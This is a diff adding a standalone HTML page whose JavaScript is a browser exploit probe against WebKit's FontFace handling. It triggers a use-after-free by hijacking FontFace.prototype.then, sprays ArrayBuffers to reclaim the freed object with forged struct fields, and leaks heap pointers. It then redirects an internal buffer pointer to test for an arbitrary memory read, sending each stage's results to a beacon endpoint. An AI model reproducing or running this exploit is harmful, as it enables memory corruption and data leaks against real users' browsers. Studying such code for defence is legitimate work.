@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P785 — Focused Re-Add UAF Loading Oracle & C++ Struct Dereference Probe</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
+  h2 { color: #58a6ff; margin-top: 0; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
+  .status { color: #f0883e; font-weight: bold; }
+  .ok { color: #7ee787; font-weight: bold; }
+  .fail { color: #f85149; font-weight: bold; }
+</style>
+<script>
+'use strict';
+window.onerror = function(msg, url, line, col, err){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P785-GLOBAL-ERR&data=' + encodeURIComponent((msg || '') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P785-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null);
+  } catch(e){}
+}
+
+var OUT = null;
+function log(s){
+  if (!OUT) OUT = document.getElementById('out');
+  if (OUT) OUT.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_VICTIM = null;
+var RECLAIM_BUF = null;
+var VIEW_RECLAIM = null;
+var BEST_K = -1;
+var LEAK_BUF = null;
+
+function run(){
+  OUT = document.getElementById('out');
+  log('=== P785 Focused Re-Add UAF Loading Oracle Probe ===\n');
+  b('BOOT', 'p785-start');
+
+  log('[Step 1] Baseline heap leak (P58/P68)...');
+  doLeak(function(){
+    log('Leak OK: P58=0x' + h16(P58) + ' P68=0x' + h16(P68) + '\n');
+
+    log('[Step 2] Triggering UAF on loading sacrificial FontFace...');
+    doLoadingUAF(function(){
+      log('[Step 3] Testing Re-Add & fonts.check() dereference...');
+      testReAddAndDereference();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO', '');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+  var face = new FontFace('fl0', 'local(Times)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired) return undefined;
+      fired = true;
+      if (st){ st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 70; k++) abs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em lk0'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em fl0, lk0', 'AB');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < abs.length; i++){
+      var u = new Uint8Array(abs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+    if (best < 0 || bestNz < 4){
+      b('LEAK-MISS', 'nz=' + bestNz);
+      return;
+    }
+    LEAK_BUF = abs[best];
+    var v = new BigUint64Array(LEAK_BUF);
+    P58 = v[6];
+    P68 = v[8];
+    b('LEAK-OK', 'p58=0x' + h16(P58) + '|p68=0x' + h16(P68));
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+/* ---- Step 2: Create Loading FontFace, UAF & Reclaim ---- */
+function doLoadingUAF(cb){
+  b('REC-START', 'loading-source');
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  // KEY ADVANCEMENT: Create victim FontFace with url(/hang.php) so it remains in 'loading' state!
+  FACE_VICTIM = new FontFace('vicLoadingFace', 'url(/hang.php?nocache=' + Date.now() + '_vic)', { unicodeRange: 'U+0041' });
+  document.fonts.add(FACE_VICTIM);
+  FACE_VICTIM.load().catch(function(){});
+
+  var absW = [], firedW = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedW) return undefined;
+      firedW = true;
+      if (stTr){ stTr.remove(); stTr.textContent = ''; stTr = null; }
+
+      // Trigger free of CSSFontFace by deleting from document.fonts
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      // Reclaim slot 192B with ArrayBuffers containing sentinel q12/q6
+      for (var k = 0; k < 80; k++){
+        var ab = new ArrayBuffer(192);
+        var v = new BigUint64Array(ab);
+        v[0] = 0x0000000000000001n; // refcount = 1
+        v[6] = P58;                  // preserve P58
+        v[12] = 0x0000002000000000n; // capacity=2, size=0
+        absW.push(ab);
+      }
+      try { document.fonts.check('1em trFam'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em vicLoadingFace, trFam', 'AG');
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for (var i = 0; i < absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    BEST_K = best;
+    if (best >= 0){
+      RECLAIM_BUF = absW[best];
+      VIEW_RECLAIM = new BigUint64Array(RECLAIM_BUF);
+      var q11 = VIEW_RECLAIM[11];
+      var q12 = VIEW_RECLAIM[12];
+      var q13 = VIEW_RECLAIM[13];
+      b('RECLAIM-OK', 'baseK=' + best + '|nz=' + bestNz + '|q11=0x' + h16(q11) + '|q12=0x' + h16(q12) + '|q13=0x' + h16(q13));
+      log('Reclaim OK: baseK=' + best + ' nz=' + bestNz + ' q11=0x' + h16(q11) + ' q12=0x' + h16(q12));
+    } else {
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+    }
+
+    setTimeout(cb, 50);
+  }, 400);
+}
+
+/* ---- Step 3: Re-Add & fonts.check() Dereference Verification ---- */
+function testReAddAndDereference(){
+  try {
+    if (!FACE_VICTIM || !VIEW_RECLAIM){
+      b('TEST-ABORT', 'missing-victim-or-view');
+      return;
+    }
+
+    var q11_orig = VIEW_RECLAIM[11];
+    var q12_orig = VIEW_RECLAIM[12];
+
+    // Status of deleted face
+    var preAddStatus = FACE_VICTIM.status;
+    var preAddHas = document.fonts.has(FACE_VICTIM);
+
+    // Test 1: Check fonts.check BEFORE re-add (Face was deleted)
+    var chkPreA = document.fonts.check('1em vicLoadingFace', 'A'); // should be in range
+    var chkPreB = document.fonts.check('1em vicLoadingFace', 'B'); // should be out of range
+    b('T1-PRE-ADD', 'status=' + preAddStatus + '|has=' + preAddHas + '|chkA=' + chkPreA + '|chkB=' + chkPreB);
+    log('T1 (Pre-Add): has=' + preAddHas + ' status=' + preAddStatus + ' chkA=' + chkPreA + ' chkB=' + chkPreB);
+
+    // Test 2: Re-add FACE_VICTIM to document.fonts
+    var addError = null;
+    try {
+      document.fonts.add(FACE_VICTIM);
+    } catch(eAdd){
+      addError = eAdd.message;
+    }
+
+    var postAddStatus = FACE_VICTIM.status;
+    var postAddHas = document.fonts.has(FACE_VICTIM);
+    b('T2-POST-ADD', 'err=' + addError + '|has=' + postAddHas + '|status=' + postAddStatus);
+    log('T2 (Post-Add): err=' + addError + ' has=' + postAddHas + ' status=' + postAddStatus);
+
+    // Test 3: Check fonts.check IMMEDIATELY AFTER re-add with virgin q11/q12
+    var chkPostA = document.fonts.check('1em vicLoadingFace', 'A');
+    var chkPostB = document.fonts.check('1em vicLoadingFace', 'B');
+    b('T3-POST-CHECK', 'chkA=' + chkPostA + '|chkB=' + chkPostB);
+    log('T3 (Post-Check Baseline): chkA=' + chkPostA + ' chkB=' + chkPostB);
+
+    // CRITICAL OBSERVATION:
+    // If the re-added loading face is active:
+    // 'A' (U+0041) matches range U+0041 and face is loading -> check('A') returns FALSE!
+    // 'B' (U+0042) does not match range U+0041 -> check('B') returns TRUE!
+    var isActiveOracle = (chkPostA === false && chkPostB === true);
+    b('T3-ACTIVE-VERDICT', 'isActiveOracle=' + isActiveOracle);
+    log('T3 Active Oracle Verdict: isActiveOracle=' + isActiveOracle);
+
+    // Test 4: In-Memory Mutation of C++ Struct q12 (Vector capacity / size)
+    // In WebKit: if size is set to 0, m_ranges.isEmpty() -> covers entire unicode space!
+    // If it covers entire space and is loading, BOTH 'A' and 'B' should return FALSE!
+    VIEW_RECLAIM[12] = 0x0000000000000000n; // Set size=0, capacity=0
+    var chkMutQ12A = document.fonts.check('1em vicLoadingFace', 'A');
+    var chkMutQ12B = document.fonts.check('1em vicLoadingFace', 'B');
+    VIEW_RECLAIM[12] = q12_orig; // Restore immediately
+    var chkRestQ12B = document.fonts.check('1em vicLoadingFace', 'B');
+
+    var q12Flipped = (chkPostB !== chkMutQ12B);
+    b('T4-Q12-MUTATION', 'chkA=' + chkMutQ12A + '|chkB=' + chkMutQ12B + '|restB=' + chkRestQ12B + '|q12Flipped=' + q12Flipped);
+    log('T4 (Q12 In-Memory Mutation): chkA=' + chkMutQ12A + ' chkB=' + chkMutQ12B + ' restB=' + chkRestQ12B + ' FLIPPED=' + q12Flipped);
+
+    // Test 5: In-Memory Redirection of C++ Buffer Pointer q11 to P58
+    // P58 is a live mapped object. Its first 8 bytes are m_refCount + flags (NOT unicode ranges).
+    // An arbitrary/invalid range will cause 'A' to return TRUE (not matching).
+    VIEW_RECLAIM[11] = P58; // Redirect q11 buffer pointer to arbitrary address P58
+    var chkMutQ11A = document.fonts.check('1em vicLoadingFace', 'A');
+    var chkMutQ11B = document.fonts.check('1em vicLoadingFace', 'B');
+    VIEW_RECLAIM[11] = q11_orig; // Restore immediately
+    var chkRestQ11A = document.fonts.check('1em vicLoadingFace', 'A');
+
+    var q11Flipped = (chkPostA !== chkMutQ11A);
+    b('T5-Q11-REDIRECT', 'chkA=' + chkMutQ11A + '|chkB=' + chkMutQ11B + '|restA=' + chkRestQ11A + '|q11Flipped=' + q11Flipped);
+    log('T5 (Q11 Pointer Redirection to P58): chkA=' + chkMutQ11A + ' chkB=' + chkMutQ11B + ' restA=' + chkRestQ11A + ' FLIPPED=' + q11Flipped);
+
+    // FINAL VERDICT:
+    var arbitraryReadProven = isActiveOracle && (q12Flipped || q11Flipped);
+    b('FINAL-VERDICT', 'arbitraryReadProven=' + arbitraryReadProven +
+                      '|active=' + isActiveOracle + '|q12Flip=' + q12Flipped + '|q11Flip=' + q11Flipped);
+    log('\n======================================================');
+    log('P785 FINAL VERDICT: Arbitrary Read Proven = ' + arbitraryReadProven);
+    log('======================================================\n');
+
+  } catch(eTest){
+    b('TEST-ERR', eTest.message);
+    log('Test Error: ' + eTest.message);
+  }
+
+  b('DONE', 'p785-complete');
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <h2>P785 — Focused Re-Add UAF Loading Oracle & C++ Struct Dereference Probe</h2>
+  <pre id="out">P785 — Initializing...</pre>
+</body>
+</html>
